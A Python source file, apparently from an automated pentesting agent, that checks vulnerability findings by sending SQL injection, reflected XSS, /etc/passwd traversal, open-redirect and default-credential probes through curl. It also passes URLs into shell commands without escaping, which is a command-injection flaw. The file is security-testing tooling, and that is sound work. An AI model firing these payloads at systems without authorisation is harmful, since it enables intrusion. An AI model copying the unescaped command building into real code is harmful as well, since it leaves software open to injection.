"""
PoC Validator - Proof of Concept validation engine.
Every finding must be validated with a working PoC before being reported.
Based on Strix's "PoC or it didn't happen" philosophy.
"""
import os
import json
import requests
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from utils.database import db


@dataclass
class PoCResult:
    """Result of PoC validation."""
    success: bool
    evidence: str
    payload: str
    response_snippet: str
    confidence: float  # 0-1, how sure we are


class PoCValidator:
    """Automated PoC validation for common vulnerability types."""

    def __init__(self):
        self.container_uri = os.getenv('container_uri', 'http://localhost:9756/exec')

    def _run_command(self, cmd: str, timeout: int = 60) -> str:
        """Execute command in Docker container."""
        try:
            resp = requests.post(
                self.container_uri,
                json={"cmd": cmd, "timeout": timeout},
                timeout=timeout + 10,
            )
            if resp.status_code == 200:
                return resp.json().get("stdout", "")
            return ""
        except Exception:
            return ""

    def validate_sql_injection(self, url: str, param: str = "") -> PoCResult:
        """Validate SQL injection with error-based PoC."""
        # Test with single quote
        test_url = f"{url}{'&' if '?' in url else '?'}{param}='" if param else f"{url}'"
        
        cmd = f'''curl -s -o /dev/null -w "%{{http_code}}" "{test_url}"'''
        error_code = self._run_command(cmd).strip()
        
        # Test with boolean-based payload
        test_true = f"{url}{'&' if '?' in url else '?'}{param}=1' OR '1'='1" if param else url
        test_false = f"{url}{'&' if '?' in url else '?'}{param}=1' OR '1'='2" if param else url
        
        cmd_true = f'''curl -s -o /dev/null -w "%{{size_download}}" "{test_true}"'''
        cmd_false = f'''curl -s -o /dev/null -w "%{{size_download}}" "{test_false}"'''
        
        size_true = self._run_command(cmd_true).strip()
        size_false = self._run_command(cmd_false).strip()
        
        # If true/false responses differ significantly, likely SQLi
        success = False
        evidence = ""
        confidence = 0.0
        
        if size_true and size_false:
            try:
                s_true = int(size_true)
                s_false = int(size_false)
                if abs(s_true - s_false) > 100:  # Significant difference
                    success = True
                    confidence = 0.7
                    evidence = f"Boolean-based: true={s_true} bytes, false={s_false} bytes"
            except ValueError:
                pass
        
        return PoCResult(
            success=success,
            evidence=evidence,
            payload=f"{param}=1' OR '1'='1",
            response_snippet=f"True: {size_true}, False: {size_false}",
            confidence=confidence,
        )

    def validate_xss(self, url: str, param: str = "") -> PoCResult:
        """Validate reflected XSS with a unique marker."""
        marker = "xssprobe12345"
        payload = f"<script>{marker}</script>"
        test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}" if param else f"{url}?q={payload}"
        
        cmd = f'''curl -s "{test_url}" | grep -c "{marker}"'''
        result = self._run_command(cmd).strip()
        
        found = result.strip() != "0" and result.strip() != ""
        
        return PoCResult(
            success=found,
            evidence=f"Marker '{marker}' found in response" if found else "Marker not reflected",
            payload=payload,
            response_snippet=result[:200],
            confidence=0.8 if found else 0.0,
        )

    def validate_directory_traversal(self, url: str, param: str = "file") -> PoCResult:
        """Validate LFI/directory traversal."""
        payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "/etc/passwd",
        ]
        
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            cmd = f'''curl -s "{test_url}" | grep -c "root:"'''
            result = self._run_command(cmd).strip()
            
            if result.strip() not in ("", "0"):
                return PoCResult(
                    success=True,
                    evidence=f"Found 'root:' in response - /etc/passwd accessible",
                    payload=payload,
                    response_snippet=result[:200],
                    confidence=0.9,
                )
        
        return PoCResult(
            success=False,
            evidence="No traversal payload worked",
            payload="",
            response_snippet="",
            confidence=0.0,
        )

    def validate_open_redirect(self, url: str, param: str = "next") -> PoCResult:
        """Validate open redirect."""
        target_domain = "evil-probe.example.com"
        test_url = f"{url}?{param}=https://{target_domain}"
        
        cmd = f'''curl -s -o /dev/null -w "%{{redirect_url}}" "{test_url}"'''
        redirect = self._run_command(cmd).strip()
        
        success = target_domain in redirect
        
        return PoCResult(
            success=success,
            evidence=f"Redirects to: {redirect}" if success else "No redirect",
            payload=f"{param}=https://{target_domain}",
            response_snippet=redirect[:200],
            confidence=0.85 if success else 0.0,
        )

    def validate_default_credentials(self, url: str) -> PoCResult:
        """Test common default credentials."""
        creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
        ]
        
        for user, passwd in creds:
            cmd = f'''curl -s -o /dev/null -w "%{{http_code}}" -u {user}:{passwd} "{url}"'''
            code = self._run_command(cmd).strip()
            
            if code == "200":
                return PoCResult(
                    success=True,
                    evidence=f"Login successful with {user}:{passwd}",
                    payload=f"{user}:{passwd}",
                    response_snippet=f"HTTP {code}",
                    confidence=0.95,
                )
        
        return PoCResult(
            success=False,
            evidence="No default credentials worked",
            payload="",
            response_snippet="",
            confidence=0.0,
        )

    def validate_finding(self, finding_id: int) -> PoCResult:
        """Validate a finding from the database."""
        findings = db.get_findings(limit=100)
        finding = next((f for f in findings if f["id"] == finding_id), None)
        
        if not finding:
            return PoCResult(False, "Finding not found", "", "", 0.0)
        
        vuln_type = finding["vuln_type"].lower()
        target = finding["target_url"]
        
        if "sql" in vuln_type or "sqli" in vuln_type:
            result = self.validate_sql_injection(target)
        elif "xss" in vuln_type:
            result = self.validate_xss(target)
        elif "lfi" in vuln_type or "traversal" in vuln_type or "file" in vuln_type:
            result = self.validate_directory_traversal(target)
        elif "redirect" in vuln_type:
            result = self.validate_open_redirect(target)
        elif "default" in vuln_type or "credential" in vuln_type:
            result = self.validate_default_credentials(target)
        else:
            result = PoCResult(False, "No validator for this vuln type", "", "", 0.0)
        
        # Update finding status based on validation
        if result.success:
            db.update_finding_status(finding_id, "verified")
        else:
            db.update_finding_status(finding_id, "unverified")
        
        # Log audit
        db.add_audit_log(
            agent="PoCValidator",
            action="validate_finding",
            command=f"validate {finding_id}",
            output=f"success={result.success}, confidence={result.confidence}",
            severity="info",
        )
        
        return result


# Global instance
poc_validator = PoCValidator()
